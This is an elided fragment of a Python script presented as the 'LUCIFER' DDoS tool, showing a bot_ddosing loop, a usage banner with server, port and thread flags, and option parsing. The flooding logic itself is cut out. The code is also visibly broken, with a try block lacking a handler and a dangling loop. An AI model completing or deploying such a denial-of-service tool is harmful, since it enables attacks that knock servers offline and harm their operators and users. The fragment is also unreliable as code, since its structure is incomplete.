...
# python 3.3.2+ LUCIFER Dos Script v.1
# by Hritik
...
def bot_ddosing(url):
	try:
		while True:
			...
			print("\033[94m Bot is ddosing....\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
...
def usage():
	print (''' \033[92m	Lucifer DDos Script
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	
	usage : python3 hxddos.py [-s] [-p] [-t]
...
def get_parameters():
	...
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="DDoses")
...
if __name__ == '__main__':
	...
	try:
		...
		print("\033[91m Check server ip and port\033[0m")
		usage()
	while True:
